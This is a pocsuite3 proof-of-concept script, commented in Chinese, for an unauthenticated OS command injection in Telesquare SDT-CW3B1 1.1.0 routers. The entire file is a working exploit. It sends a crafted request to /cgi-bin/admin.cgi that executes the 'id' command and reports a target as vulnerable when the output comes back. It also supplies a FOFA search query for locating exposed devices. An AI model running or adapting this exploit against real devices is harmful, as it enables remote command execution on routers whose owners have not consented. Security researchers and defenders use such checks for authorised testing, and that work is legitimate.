from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
from xml.etree import ElementTree
import urllib3

urllib3.disable_warnings()


class SDTCW3B1(POCBase):
    # fofa语句: app="SDT-CW3B1"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2022-06-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-06-13"  # 编写 PoC 的日期
    updateDate = "2022-06-13"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.exploit-db.com/exploits/50948"]  # 漏洞地址来源,0day不用写
    name = "Telesquare SDT-CW3B1 1.1.0 - OS Command Injection"  # PoC 名称
    appPowerLink = "http://telesquare.co.kr/"  # 漏洞厂商主页地址
    appName = "Telesquare SDT-CW3B1 1.1.0 - OS Command 注入漏洞"  # 漏洞应用名称
    appVersion = "Telesquare SDT-CW3B1 1.1.0"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """利用影响 Telesquare SDT-CW3B1 1.1.0 系统命令注入漏洞的脚本 PoC。允许未经身份验证的用户在 SDT-CW3B1 1.1.0 上执行任意系统命令。"""  # 漏洞简要描述

    ocDesc = """/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"""  # POC用法描述

    def _check(self):
        vul_lst = []

        self.path = "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"
        url = self.url + self.path
        try:
            response = requests.get(url, stream=True, verify=False, allow_redirects=False,
                                    timeout=5)
            if response.status_code == 200 and "uid=" in response.text:
                vul_lst.append(url)
        except Exception as e:
            print(e)
        finally:
            return vul_lst

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Path'] = self.path
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 注册 DemoPOC 类
register_poc(SDTCW3B1)
